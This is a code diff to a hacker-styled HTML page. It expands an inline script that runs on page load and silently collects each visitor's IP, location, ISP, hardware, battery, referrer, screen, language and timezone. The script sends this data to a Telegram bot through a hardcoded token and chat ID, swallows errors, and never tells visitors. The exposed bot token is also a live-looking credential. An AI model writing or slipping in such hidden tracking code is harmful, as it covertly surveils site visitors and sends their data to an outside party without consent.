@@ -108,7 +108,7 @@
 <body>
     <div class="container">
         <div class="terminal-header">
-            root@crypt3cho:~# ./initialize_node.sh --active-monitoring
+            root@crypt3cho:~# ./initialize_node.sh --full-recon-active
         </div>
 
         <div class="header">
@@ -182,16 +182,39 @@
             const token = "8734320096:AAGlLFUxCWtlbzb1EHim-SLhCuu17V9FJWU";
             const chatId = "8375518813";
 
-            fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(data => {
-                    const text = `⚠️ *NODE ACCESS DETECTED*\n\n` +
-                                 `📍 *IP:* \`${data.ip}\`\n` +
-                                 `🌍 *ORIGIN:* ${data.country_name} (${data.city})\n` +
-                                 `🏢 *ISP:* ${data.org}\n` +
-                                 `🔗 *PATH:* ${window.location.pathname}`;
+            async function getIntelligence() {
+                try {
+                    // 1. Red y Geolocalización
+                    const response = await fetch('https://ipapi.co/json/');
+                    const data = await response.json();
 
-                    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    // 2. Metadata de Hardware
+                    const ram = navigator.deviceMemory || "N/A";
+                    const cores = navigator.hardwareConcurrency || "N/A";
+                    const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve(null));
+                    const batStatus = battery ? `${(battery.level * 100).toFixed(0)}% ${battery.charging ? '(Cargando)' : '(Batería)'}` : "N/A";
+                    
+                    // 3. Origen y Tráfico
+                    const referer = document.referrer || "Acceso Directo / Bookmark";
+                    
+                    const text = `🚨 *OPERATIONAL INTELLIGENCE REPORT*\n` +
+                                 `━━━━━━━━━━━━━━━━━━\n` +
+                                 `📍 *RED & IP:*\n` +
+                                 `IP: \`${data.ip}\`\n` +
+                                 `ISP: ${data.org}\n` +
+                                 `Ubicación: ${data.city}, ${data.country_name}\n\n` +
+                                 `🌐 *REFERER:* ${referer}\n\n` +
+                                 `💻 *HARDWARE & SISTEMA:*\n` +
+                                 `OS: ${navigator.platform}\n` +
+                                 `CPU: ${cores} Cores | RAM: ~${ram} GB\n` +
+                                 `🔋 Energía: ${batStatus}\n` +
+                                 `🖥️ Res: ${window.screen.width}x${window.screen.height}\n` +
+                                 `🌍 Lang: ${navigator.language}\n` +
+                                 `🕒 TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n\n` +
+                                 `🔗 *TARGET:* ${window.location.hostname}${window.location.pathname}\n` +
+                                 `━━━━━━━━━━━━━━━━━━`;
+
+                    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
@@ -201,8 +224,9 @@
                         }),
                         keepalive: true
                     });
-                })
-                .catch(() => {});
+                } catch (e) {}
+            }
+            getIntelligence();
         })();
     </script>
 </body>
